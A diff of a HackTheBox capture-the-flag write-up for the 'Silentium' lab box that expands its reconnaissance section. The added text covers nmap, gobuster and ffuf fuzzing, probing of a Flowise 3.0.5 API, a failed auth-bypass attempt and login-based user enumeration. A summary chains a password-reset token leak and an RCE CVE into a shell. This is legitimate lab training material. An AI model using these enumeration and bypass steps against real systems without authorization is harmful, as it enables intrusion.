@@ -1,6 +1,6 @@
 # Silentium – HackTheBox Writeup
 
-**Target:** Silentium (10.129.245.103)
+**Target:** Silentium (10.129.43.53)
 **Attacker:** Kali Linux
 **OS:** Linux (Ubuntu)
 **Difficulty:** Easy
@@ -13,24 +13,184 @@
 ### Port Scan
 
 ```bash
-nmap -sV -p- --min-rate 5000 10.129.245.103
+nmap -sV -sC -p- --min-rate 5000 10.129.43.53
 ```
 
-Standard stuff. SSH on 22 and nginx on 80. The website at `silentium.htb` is some kind of financial services page. Added it to /etc/hosts and started poking around.
+Two ports open. SSH on 22 running OpenSSH 9.6p1 Ubuntu 3ubuntu13.15, and HTTP on 80 running nginx 1.24.0. Both relatively current versions so no direct exploits expected. The OS is Ubuntu, likely 24.04 Noble based on the OpenSSH package version.
+
+Added hostname to /etc/hosts:
+
+```bash
+echo '10.129.43.53    silentium.htb' | sudo tee -a /etc/hosts
+```
+
+### Website Analysis
+
+The website at `silentium.htb` is a static financial services page called "Silentium | Institutional Capital & Lending Solutions". Built with Tailwind CSS, uses Inter and Playfair Display fonts. The response headers confirmed it's purely static:
+
+```bash
+curl -I http://silentium.htb
+# Content-Type: text/html
+# Content-Length: 8753
+# Last-Modified: Mon, 16 Mar 2026 22:21:29 GMT
+```
+
+Static HTML at 8753 bytes, no PHP, no framework, no backend. Has three sections visible: Solutions, Calculator (loan structuring tool with sliders), and Leadership.
+
+### Directory Fuzzing
+
+Ran Gobuster but had to filter out the default 8753-byte response since the server returns the same page for every non-existent path:
+
+```bash
+gobuster dir -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt --exclude-length 8753
+```
+
+Only found `/assets/` (301 redirect). Nothing else. Tried with larger wordlists and file extensions like php, html, txt, bak, conf but nothing new came up. Dead end on the main site.
+
+### Gathering Usernames from the Website
+
+The Leadership section on the main page revealed three team members:
+
+```bash
+curl -s http://silentium.htb | sed -n '/id="team"/,/<\/section>/p'
+```
+
+- **Marcus Thorne** — Managing Director
+- **Ben** — Head of Financial Systems (only a first name, no surname)
+- **Elena Rossi** — Chief Risk Officer
+
+Ben stands out because he's the tech person ("Leads internal underwriting systems, analytics platforms, and capital workflow infrastructure") and he only has a first name listed. Filed these for later username enumeration.
 
 ### Subdomain Discovery
 
-The main site didn't have much going on so I went looking for subdomains:
+The main site was a dead end so I went hunting for subdomains using ffuf. First grabbed the default response size to filter it out:
 
 ```bash
-ffuf -u http://10.129.245.103 -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154
+curl -k -s http://10.129.43.53 | wc -c
+# 8753 — but ffuf measured it differently, so I used the size from the first ffuf run
 ```
 
-Found `staging.silentium.htb`. Added it to hosts and hit it in the browser. It's running Flowise 3.0.5, which is an AI agent builder platform. Has a login page at `/signin`.
+Then fuzzed:
+
+```bash
+ffuf -u http://10.129.43.53 -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154
+```
+
+Found `staging.silentium.htb` with status 200 and size 3142. Added it to /etc/hosts on the same line:
+
+```bash
+sudo sed -i '/silentium/d' /etc/hosts
+echo '10.129.43.53    silentium.htb staging.silentium.htb' | sudo tee -a /etc/hosts
+```
+
+### Identifying Flowise
+
+Hit the staging subdomain and immediately recognized it:
+
+```bash
+curl -s http://staging.silentium.htb | head -50
+```
+
+The HTML title said "Flowise - Build AI Agents, Visually" and the meta tags confirmed it's FlowiseAI, an open source AI agent builder platform. Confirmed the version through the API:
+
+```bash
+curl -s http://staging.silentium.htb/api/v1/version
+# {"version":"3.0.5"}
+```
+
+Flowise 3.0.5. Immediately searched for known vulnerabilities:
+
+```bash
+searchsploit flowise
+```
+
+Found two exploits:
+- **Flowise 1.6.5 - Authentication Bypass** (52001.txt) — Case sensitivity bypass on `/api/v1` paths
+- **Flowise 3.0.4 - Remote Code Execution** (52440.py) — CVE-2025-59528, RCE via CustomMCP endpoint
+
+The RCE exploit is for version 3.0.4 but close enough to our 3.0.5 to be worth trying. However, it requires valid credentials (email + password).
+
+### Testing Authentication and Access
+
+The main API endpoints all require authentication:
+
+```bash
+curl -s http://staging.silentium.htb/api/v1/chatflows
+curl -s http://staging.silentium.htb/api/v1/credentials
+curl -s http://staging.silentium.htb/api/v1/nodes
+curl -s http://staging.silentium.htb/api/v1/tools
+# All returned: {"error":"Unauthorized Access"}
+```
+
+Tried the auth bypass from the older CVE (case sensitivity trick) but it didn't work on 3.0.5:
+
+```bash
+curl -s http://staging.silentium.htb/Api/V1/chatflows
+curl -s http://staging.silentium.htb/API/V1/credentials
+# Still: {"error":"Unauthorized Access"}
+```
+
+Registration was also blocked:
+
+```bash
+curl -s http://staging.silentium.htb/api/v1/auth/register \
+  -H "Content-Type: application/json" \
+  -d '{"email":"test@silentium.htb","password":"Test@1234"}'
+# {"error":"Unauthorized Access"}
+```
+
+### Enumerating Open Endpoints
+
+Used ffuf to find API endpoints that don't require authentication:
+
+```bash
+ffuf -u http://staging.silentium.htb/api/v1/FUZZ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -fs 3142 \
+  -fc 401 \
+  -t 50
+```
+
+Found five open endpoints: `ip`, `ping`, `pricing`, `settings`, and `version`. Queried them all:
+
+```bash
+curl -s http://staging.silentium.htb/api/v1/ip
+# {"ip":"::ffff:172.18.0.1", ...} — Docker network! Flowise runs in a container
+
+curl -s http://staging.silentium.htb/api/v1/ping
+# pong
+
+curl -s http://staging.silentium.htb/api/v1/settings
+# {"PLATFORM_TYPE":"open source"}
+```
+
+The IP response revealed `172.18.0.1` which is a Docker bridge network address, confirming Flowise runs inside a Docker container. The settings confirmed it's the open source version.
+
+### JavaScript Bundle Analysis
+
+The staging site is a React SPA so all frontend logic is in the JavaScript bundles. Found the JS files in `/assets/`:
+
+```
+auth-15PRqe3J.js
+signIn-CkZA4Bh9.js
+sso-OzNFFVrG.js
+auth0-D4RPhjaI.js
+github-BtlA98as.js
+index-C6GKaUTA.js
+```
+
+Searched for hardcoded credentials, API keys, and UUIDs:
+
+```bash
+curl -s http://staging.silentium.htb/assets/index-C6GKaUTA.js | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
+# 07167752-1a71-43b1-bf8f-4f32252165db
+```
+
+Found one UUID but it turned out to be a default from the Flowise source code, not an actual chatflow ID in the database. The signIn and auth JS files were standard Flowise login code with no hardcoded credentials.
 
 ### Finding a Valid User
 
-The login endpoint gives different errors for existing vs nonexistent users. Classic user enumeration. Tested a bunch of email addresses:
+The login endpoint gives different error messages for existing vs nonexistent users. Classic user enumeration vulnerability:
 
 ```bash
 for user in marcus.thorne mthorne marcus ben elena.rossi erossi elena admin; do
@@ -42,7 +202,7 @@ for user in marcus.thorne mthorne marcus ben elena.rossi erossi elena admin; do
 done
 ```
 
-`ben@silentium.htb` returned `"Incorrect Email or Password"` (401) while everything else returned `"User Not Found"` (404). So ben is a valid user. Now I need his password.
+`ben@silentium.htb` returned `"Incorrect Email or Password"` (HTTP 401) while everything else returned `"User Not Found"` (HTTP 404). So ben is a valid user. The `x-request-from: internal` header was needed for some endpoints but not for the basic login enumeration.
 
 ---
 
@@ -290,9 +450,16 @@ Box pwned.
 ## Attack Chain Summary
 
 ```
-nmap → staging.silentium.htb discovered
-→ Flowise 3.0.5 identified
-→ User enumeration → ben@silentium.htb exists
+nmap → SSH 22 (OpenSSH 9.6p1), HTTP 80 (nginx 1.24.0)
+→ Main site: static financial services page, gathered usernames from Leadership section
+→ gobuster --exclude-length 8753 → only /assets/, dead end
+→ ffuf subdomain discovery → staging.silentium.htb
+→ Flowise 3.0.5 identified via /api/v1/version
+→ searchsploit → CVE-2025-59528 (RCE) found, needs auth
+→ Auth bypass (case sensitivity) failed on 3.0.5
+→ Register endpoint blocked
+→ Open endpoints found: /api/v1/ip (Docker 172.18.0.1), /ping, /settings, /pricing
+→ User enumeration via login error messages → ben@silentium.htb exists (401 vs 404)
 → CVE-2025-58434 (Password Reset Token Leak) → reset ben's password
 → Login → JWT cookies
 → CVE-2025-59528 (RCE via customMCP) → shell in Docker container
@@ -307,6 +474,16 @@ nmap → staging.silentium.htb discovered
 ---
 
 ## What I Learned
+
+Always start with the website content. The Leadership section had three employee names and their roles. Ben being "Head of Financial Systems" with only a first name hinted he was the key user. Those names became the username list for enumeration.
+
+Gobuster's `--exclude-length` flag is essential when the server returns the same page for everything. The main site returned 8753 bytes for every non-existent path, and the staging site returned 3142 bytes. Without filtering these out, every single wordlist entry looks like a hit.
+
+When the main site is a dead end, subdomain enumeration is the next move. Static sites with nginx often have virtual hosts hiding behind other subdomains. ffuf with the Host header and `-fs` to filter the default response size found the staging subdomain immediately.
+
+User enumeration through error message differences is powerful. The Flowise login returned "User Not Found" (404) for invalid emails and "Incorrect Email or Password" (401) for valid ones. That single difference confirmed `ben@silentium.htb` without any password guessing.
+
+Enumerating open API endpoints with ffuf saved time. Instead of guessing endpoints, fuzzing `/api/v1/FUZZ` with `-fc 401 -fs 3142` revealed five unauthenticated endpoints. The `/api/v1/ip` response leaking `172.18.0.1` confirmed Docker before I even got a shell.
 
 The difference between `/api/v1/auth/` and `/api/v1/account/` endpoints matters. I spent way too long hitting the wrong endpoint for the password reset. Always read the JavaScript bundle to understand the actual frontend routes. The minified code had the exact request format and endpoint paths.
 
